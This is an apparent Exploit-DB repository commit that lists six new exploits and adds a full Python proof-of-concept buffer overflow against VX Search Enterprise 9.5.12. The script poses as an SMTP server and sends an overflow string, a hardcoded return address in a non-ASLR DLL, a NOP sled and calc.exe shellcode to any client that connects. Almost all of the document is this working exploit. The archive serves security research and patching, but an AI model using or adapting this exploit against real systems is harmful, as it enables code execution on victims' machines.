8f7e041fcc4adba34d650c0884fbd1ecf6061dbc
Offensive Security <info@exploit-db.com>
2017-03-29 05:01:19 +0000

    DB: 2017-03-29
    6 new exploits
    
    MikroTik RouterBoard 6.38.5 - Denial of Service
    VX Search Enterprise 9.5.12 - 'Verify Email' Buffer Overflow
    Microsoft Outlook - HTML Email Denial of Service
    
    Intermec PM43 Industrial Printer - Privilege Escalation
    
    DzSoft PHP Editor 4.2.7 - File Enumeration
    
    Linux/x86-64 - execve(_/bin/sh_) Shellcode (21 Bytes)

---
+++ platforms/windows/dos/41755.py
@@ -0,0 +1,58 @@
+author = '''
+  
+                ##############################################
+                #    Created: ScrR1pTK1dd13                  #
+                #    Name: Greg Priest                       #
+                #    Mail: ScR1pTK1dd13.slammer@gmail.com    # 
+                ##############################################
+  
+# Exploit Title: VX Search Enterprise v9.5.12 email verify exploit
+# Date: 2017.03.28
+# Exploit Author: Greg Priest
+# Version: VX Search Enterprise v9.5.12
+# Tested on: Windows7 x64 HUN/ENG Professional
+'''
+
+
+import socket
+
+port = 25
+s = socket.socket()
+ip = '127.0.0.1'            
+s.bind((ip, port))            
+s.listen(5)                    
+
+overflow = "A" * 256
+eip = "\x7A\xB7\x1B\x65"
+# Search NO ASLR with mona.py
+#"\x94\x21\x1C\x65" NO ASLR QtGui4.dll
+#"\x7A\xB7\x1B\x65" NO ASLR QtGui4.dll
+#"\x09\xc9\x1D\x65" NO ASLR QtGui4.dll
+nop = "\x90" * 12
+#calc.exe
+shellcode =(
+"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f" +
+"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b" +
+"\x77\x20\x8b\x3f\x80\x7e\x0c\x33" +
+"\x75\xf2\x89\xc7\x03\x78\x3c\x8b" +
+"\x57\x78\x01\xc2\x8b\x7a\x20\x01" +
+"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6" +
+"\x45\x81\x3e\x43\x72\x65\x61\x75" +
+"\xf2\x81\x7e\x08\x6f\x63\x65\x73" +
+"\x75\xe9\x8b\x7a\x24\x01\xc7\x66" +
+"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7" +
+"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9" +
+"\xb1\xff\x53\xe2\xfd\x68\x63\x61" +
+"\x6c\x63\x89\xe2\x52\x52\x53\x53" +
+"\x53\x53\x53\x53\x52\x53\xff\xd7")
+
+exploit = overflow+eip+nop+shellcode
+
+print "Listening on port:", port
+
+while True:
+    conn, addr = s.accept()     
+    conn.send(exploit+'\r\n')
+    conn.close()
+    print ""
+    print "Succesfully exploitation!"
